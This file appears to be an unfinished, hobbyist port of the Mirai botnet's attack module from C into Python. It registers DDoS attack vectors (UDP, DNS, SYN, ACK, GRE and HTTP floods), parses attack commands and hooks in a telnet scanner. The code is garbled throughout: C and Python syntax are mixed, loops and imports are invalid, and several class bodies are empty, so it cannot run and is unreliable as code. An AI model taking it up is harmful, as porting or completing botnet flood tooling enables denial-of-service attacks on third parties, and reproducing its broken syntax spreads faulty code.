# define GNU source license

# actually these are other modules in the Mirai botnet directory

# these needs to be changed to whatever module.py they are when I am done with it
if DEBUG:
    import stdio.h # Import the stdio C library, but I dont think I have one in python unless its C types
else:
    import <stdlib.h>
    import <unistd.h>
    import <signal.h>
    import <errno.h>

import "imports.h"
import "attack.h"
import "rand.h"
import "util.h"
import "scanner.h"
import struct
import binaascii
from termcolor import colored
import socket

# void, is a function with empty returns, or no return line
# https://en.wikipedia.org/wiki/Void_type

# actually "struct" can be used, its called a struct class in python, so make sure to change all the portions where it said struct, and make it a class (by struct)

def attack_init():
    while True:
        for i and i < length in i:
            if opts[i].val != NULL:
                free(opts[i].val)
                free(opts)
        attack_init = True
    return attack_init

def free(opts):
    i = int(i) # Line 32 in attack.c, I dont think this is correct, I think its this...
    for i in i: # or something integer, for i in [0:] or something like that
    add_attack(ATK_VEC_UDP, attack_udp_generic)
    add_attack(ATK_VEC_VSE, attack_udp_vse)
    add_attack(ATK_VEC_DNS, attack_udp_dns)
    add_attack(ATK_VEC_UDP_PLAIN, attack_udp_plain)

    add_attack(ATK_VEC_SYN, attack_tcp_syn)
    add_attack(ATK_VEC_ACK, attack_tcp_ack)
    add_attack(ATK_VEC_STOMP, attack_tcp_stomp)

    add_attack(ATK_VEC_GREIP, attack_gre_ip)
    add_attack(ATK_VEC_GREETH, attack_gre_eth)

    add_attack(ATK_VEC_HTTP, attack_app_http)

def attack_kill_all():

    for i in i:

    if DEBUG == True:
        print colored('[attack] Killing all ongoing attacks','yellow',attrs=['bold'])

    else:
        for i in i[0:i < ATTACK_CONCURRENT_MAX]:
            if attack_ongoing != 0:
                # line 63 of attack. c is to terminate the process, or stop the ddos attack
                # for now I will use exit(0)
                exit(0)

                # lines for 58 to 65 is to terminate the attack with a on and off switch

    if MIRAI_TELNET == True:
        scanner_init()
    else:
        attack_parse(buf, len)


    return

def find_size_of(input_val): # finds size of in bytes
    length[input_val] = len(input_val)
    return length[input_val]

def find_len_of(input_val): # returns the length of a object
    # size_of[input_val] = os.stat(input_val)
    size_of[input_val] = os.system.getsize(input_val)
    return size_of[input_val]


def attack_parse(buf, len): # this should be ABOVE the top then for this to work.
        # uint32_t = unsigned integer, 4 byte
        # uint8_t = unsigned char, 1 byte
        # uint16_t = unsigned short, 2 bytes
        # uint64_t = unsigned long long, eight bytes

    i = str(i)
    for i in i:
        ATTACK_VECTOR = vector
        str(targs_len, opts_len)
        struct attack_target # instead of this... make another class
    #// Read in attack duration uint32_t of unsigned integer

        # if (length < size of uint32_t):
        # if length < size of uint32_t: # we need to make a find size of function and a find length of function
        #     cleanup()

        if length[input_val] < size_of[uint32_t]:
            cleanup()
        duration = ntohl(*)# converts a unsigned integer of long from TCP/IP to host byte order little endian)
        # need to find the python equivalent of this
        duration = ntohl(*((uint32_t *)buf))
        buf += sizeof (uint32_t)
        length -= sizeof (uint32_t)
        # https://msdn.microsoft.com/en-us/library/windows/desktop/ms740069%28v=vs.85%29.aspx
        # read in attack ID, unsigned string
        if length[uint8_t] == 0:
            cleanup() # since length means something in python, length should be changed to another variable

        # read in target count unsigned string

        # read in all targets

        # read in flag count unsigned string

        # read in all options
    return

def attack_start():

class add_attack(ATTACK_VECTOR, ATTACK_FUNC):

class free_opt(attack_option opts, len):

# turning anything that says struct into a class
class attack_target(object):
    def __init__ (self, targs):
        self.targs = targs # targets

class attack_option(object):
    def __init__ (self, opts):
        self.opts = opts



class attack_option:
